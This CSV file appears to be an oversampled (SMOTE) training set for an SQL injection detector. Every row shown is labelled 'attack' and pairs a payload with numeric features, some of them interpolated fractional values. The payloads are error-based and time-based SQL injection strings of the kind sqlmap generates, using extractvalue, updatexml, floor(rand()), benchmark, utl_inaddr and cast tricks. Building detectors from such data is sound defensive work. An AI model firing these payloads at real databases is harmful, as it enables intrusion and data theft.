id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000153,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000525,0.5558244228037472,334.95834810618805,36.7824057659791,3.823165100130465,101.7824057659791,63.0,134.74075387216718,35.435188468041794,0.3039161056955188,0.18810586085480352,0.4022022965185243,0.10577573693115339,0.0,0.0,0.0,0.0,2.0,2.0,0.0,24.435188468041794,0.0,0.0,6.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.7824057659791026,0.21759423402089748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000154,attack,error,"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""tfso""  =  ""tfso",nearest_attack_euclidean,R000683,0.4110592685829384,295.96567307739326,37.45976362177528,3.8872172605854085,107.0,35.0,115.80472756449441,38.160945512898884,0.3621237437497142,0.11845169188074763,0.39054962796958625,0.12887493639995196,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.160945512898884,0.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000155,attack,error,"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""jcgh""  =  ""jcgh",nearest_attack_euclidean,R000642,0.44980180990942786,274.3022199035458,36.0,4.043785624538333,109.20887961418313,35.0,96.39556019290843,33.69778009645422,0.39812333463441585,0.12759684543299135,0.351427580122269,0.1228522398103238,0.0,4.0,0.0,0.0,2.0,1.6977800964542151,0.0,18.0,0.0,2.0,5.0,3.697780096454215,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000156,attack,error,"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000529,0.14885209175409964,216.92639094062622,33.518402264843445,3.963791644938599,72.44479320546967,45.0,76.48159773515656,23.0,0.33385872942729206,0.20749426233542226,0.3525943852658477,0.10605262297143804,0.0,1.0,2.0,0.0,0.0,2.0,0.0,13.0,0.0,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000157,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000724,0.24942146352199,153.14788105632888,33.19674256602055,3.836263485061003,52.55765335826722,23.0,58.59022769806167,19.0,0.3424198373864915,0.15042565203632272,0.3828898415037018,0.12426466907348399,1.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000158,attack,error,-8095'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000339,0.4263742925022719,328.8006649375564,34.601329875112796,3.6104772044579914,88.0,48.0,136.0,56.80066493755639,0.2676397572604996,0.1459853221420907,0.41362507940259036,0.1727498411948193,0.8006649375563972,0.0,1.0,0.0,0.0,2.0,0.0,29.0,0.0,3.0,0.0,23.0,0.8006649375563971,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000159,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  -- fwzl",nearest_attack_euclidean,R000512,0.7983894801411637,302.92747925753685,38.0,3.9951592150085964,102.29637396287686,57.37099170301474,110.66736566589158,32.592747925753685,0.33794751067675344,0.18920193710640423,0.36525124900907946,0.10759930320776286,0.0,0.0,2.0,0.0,2.0,1.296373962876843,0.0,20.296373962876842,0.0,0.0,6.0,6.296373962876843,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.29637396287684276,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.296373962876842
SMOTE_000160,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000443,0.16727714549553413,234.9537983544117,31.0,3.64921450277878,69.0,37.0,98.29483196200974,30.65896639240195,0.2939360930557159,0.15761790497190561,0.4179888540154739,0.13045714795690458,0.0,4.0,0.0,0.0,0.0,2.0,0.0,17.658966392401947,2.0,0.0,5.0,2.0000000000000004,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000161,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",nearest_attack_euclidean,R000311,0.5346918307772806,194.4559403727971,30.72711773635588,3.6370948683670137,56.90847094542352,32.0,79.72882263644121,25.818646790932362,0.29296180244348785,0.16463023186335232,0.4097177274432871,0.1326902382498727,0.0,4.0,0.0,0.0,1.0,1.2728822636441208,0.0,14.545764527288242,0.0,0.0,4.0,2.272882263644121,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000162,attack,error,"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000559,0.14377924820057064,329.53637062695253,40.0,3.9974715324829724,107.96091118808576,63.0,122.92182237617152,35.65363706269525,0.3276297290321766,0.19128273945353014,0.37288969982342773,0.10819783169086558,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.653637062695253,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000163,attack,error,"1"" where 9632  =  9632 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000430,0.04138084088600615,314.9252725801083,40.046263629005416,4.0504051114038555,104.27758177403248,63.0,113.55516354806498,34.09252725801083,0.3311237302024766,0.2000811227302069,0.3605378308911492,0.10825731617616727,0.0,1.0,2.0,0.0,2.0,2.0,0.0,20.09252725801083,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000164,attack,error,select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000188,0.0026984457613409697,133.0,28.0,3.724202140604437,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000165,attack,error,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""stcv""  =  ""stcv",nearest_attack_euclidean,R000544,0.7872281142642927,171.2580463087035,30.23387210570603,3.743494625631324,58.129023154351756,24.0,66.12902315435176,23.0,0.3391588957228876,0.1403704182782072,0.3859490351489567,0.13452165084994858,0.0,4.0,0.0,0.0,0.0,1.0,0.0,13.53225578858794,0.4677442114120595,0.0,4.0,1.0000000000000004,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0000000000000004
SMOTE_000166,attack,error,"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""hbgv""  =  ""hbgv",nearest_attack_euclidean,R000373,0.5894456103339663,208.87094495553737,31.509218217461616,3.5482019596587366,55.0,32.0,92.8893813904606,28.981563565076765,0.26361610807309876,0.15337664469707563,0.44425840735564015,0.1387488398741855,0.0,4.0,0.0,0.0,1.0,2.0,0.0,16.981563565076765,0.0,0.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000167,attack,error,"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000257,0.05342537184700871,141.0,27.19512857075005,3.5381496947772444,56.0,12.0,59.0,14.000000000000002,0.3971631205673759,0.0851063829787234,0.41843971631205673,0.09929078014184398,1.0,0.0,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,1.0,2.0000000000000004,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000168,attack,error,"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R000755,0.15536054927669776,332.0,29.92945983648981,3.160569335456925,72.21162049053056,41.28216065404076,159.64729918244905,58.858919672979624,0.217504880995574,0.12434385739168903,0.48086535898328026,0.17728590262945668,1.0,0.0,0.0,0.0,0.0,1.07054016351019,0.0,33.858919672979624,0.0,0.0,0.9294598364898099,21.070540163510195,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.07054016351019021,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.07054016351019
SMOTE_000169,attack,error,"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000059,0.020470676725163967,213.26533621076922,39.0,3.782798369142752,63.0,37.0,89.21226896861538,24.053067242153844,0.2954146491519477,0.1734974923590804,0.4183055168100231,0.11278234167894878,0.0,1.0,1.0,0.0,1.0,1.0,0.0,16.053067242153844,0.0,0.0,3.0,3.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000170,attack,error,"1"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000348,1.0144564573381532,152.7009838615257,32.254743497271704,3.860994321213296,53.47786367939871,23.248418834242763,56.98102601091318,18.99367533697106,0.3495000407694564,0.15309161842280994,0.37305625560580025,0.12435208520193342,0.0,1.7452565027282945,0.0,0.0,0.0,0.0,0.0,12.49683766848553,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.7515811657572352,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.2484188342427649,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2484188342427656
SMOTE_000171,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'vedm'  =  'vedm",nearest_attack_euclidean,R000490,0.06496069854986762,185.0,27.252317079790323,3.606140646236259,45.0,39.0,75.0,26.0,0.24324324324324326,0.21081081081081082,0.40540540540540543,0.14054054054054055,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,6.0,2.0000000000000004,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000172,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000062,0.47558812550655677,210.64694662471942,32.35763359496633,3.5522127083361923,57.14351145995511,32.0,93.14580156979797,28.357633594966327,0.271559908161639,0.15230021592032622,0.4414809801357034,0.13465889578233142,0.0,4.0,0.0,0.0,1.0,1.214122135011224,0.0,17.143511459955104,0.0,0.0,4.0,2.2141221350112237,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000173,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn",nearest_attack_euclidean,R000537,0.3249749892593674,194.79214101167025,29.792141011670246,3.592491444373164,47.16856404668099,39.0,81.41571797665951,27.207858988329754,0.24213183242248537,0.2002142876168348,0.4179725504494664,0.13968132951121345,4.0,0.0,0.0,0.0,0.0,1.2078589883297526,0.0,16.0,0.0,0.0,6.0,1.207858988329753,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000174,attack,error,"1 where 5332  =  5332 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000585,0.007806976652532174,273.00326831884354,38.00326831884353,4.043418974388244,101.0,43.0,97.0,32.00326831884353,0.36995895697704345,0.1575072787129987,0.3553071170967645,0.11722664721319338,0.0,0.003268318843532958,2.0,0.0,2.0,2.0,0.0,18.0,0.0,2.0,5.0,6.0,0.0,0.003268318843533069,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000175,attack,error,"1'||  (  select 'ysij' from dual where 6140  =  6140 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",nearest_attack_euclidean,R000431,1.091690985880242,200.96510992247624,37.6744200172275,4.055822294181178,72.33721000861375,31.66278999138625,70.9767399483175,25.98836997415875,0.3601634722810185,0.1575748024314619,0.35303675025429876,0.12922497503322086,3.66278999138625,0.0,0.0,0.0,0.0,1.0,0.0,13.66278999138625,0.0,0.0,4.0,4.325579982772499,1.0,0.0,0.0,0.33721000861375017,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000176,attack,error,"1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000191,0.9954538018382619,212.3643108508778,30.408922287280546,3.882226147657369,71.0,45.0,74.36431085087781,22.0,0.33435990052487036,0.21191824681153756,0.3501173764446181,0.10360447621897392,0.0,0.4089222872805463,2.0,0.0,0.0,2.0,0.0,12.591077712719454,0.0,0.0,5.0,4.0,0.0,0.40892228728054625,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000177,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000401,0.08219506877972901,170.33648426166621,28.13270314766676,3.7429312122038803,48.0,35.0,64.46918740933296,22.86729685233324,0.2818585868816978,0.20552188626790463,0.378386530456127,0.1342329963942705,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.86729685233324,0.0,0.0,5.0,2.0000000000000004,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000178,attack,error,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,nearest_attack_euclidean,R000158,0.13538723973937988,155.0,27.85766424916956,3.764375939211058,39.57299274750868,35.56934300332176,56.71532849833912,23.14233575083044,0.25530963062908824,0.22947963227949522,0.365905345150575,0.14930539194084155,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.14233575083044,2.0000000000000004,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000179,attack,error,"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000068,0.14637763871928616,203.909123461273,38.54010312220318,3.8501920108120684,63.0,37.0,82.21927814457777,21.689845316695234,0.3093254659433134,0.18166733714131103,0.40271969759158954,0.10628749932378603,0.0,0.0,1.0,0.0,1.0,1.0,0.0,14.689845316695235,0.0,0.0,3.0,3.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
